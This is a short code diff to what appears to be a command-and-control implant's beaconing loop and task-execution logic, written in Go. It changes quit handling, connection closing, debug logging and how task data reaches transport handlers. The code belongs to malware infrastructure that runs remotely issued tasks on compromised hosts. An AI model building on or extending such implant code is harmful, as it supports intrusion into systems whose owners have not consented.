@@ -62,6 +62,8 @@ func (t *C2) ServeBeacon() {
 	for {
 		select {
 		case <-t.closed:
+			t.closed <- struct{}{} // Acklowledge quit
+
 			// {{if .Config.Debug}}
 			log.Printf("[beacon] Exiting beaconing loop")
 			// {{end}}
@@ -113,7 +115,7 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 
 	// Recreate a new, clean session layer when we use beacons.
 	t.Beacon.connection = t.Connection
-	defer t.Connection.Close()
+	defer t.Beacon.connection.Close()
 
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
@@ -192,7 +194,8 @@ func (t *C2) ExecuteBeaconTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
 
 	for _, task := range tasks {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] execute task %#v", task)
+		log.Printf("[beacon] execute task %#d", task.ID)
+		log.Printf("         Type          %d", task.Type)
 		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
 			wg.Add(1)
@@ -215,9 +218,9 @@ func (t *C2) ExecuteBeaconTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
 			})
 		} else if handler, ok := transportHandlers[task.Type]; ok {
 			wg.Add(1)
-			var envelope = &pb.Envelope{ID: task.ID, Data: task.Data}
+			data := task.Data
 			taskID := task.ID
-			go handler(envelope, func(data []byte, err error) {
+			go handler(data, func(data []byte, err error) {
 				resultsMutex.Lock()
 				defer resultsMutex.Unlock()
 				defer wg.Done()
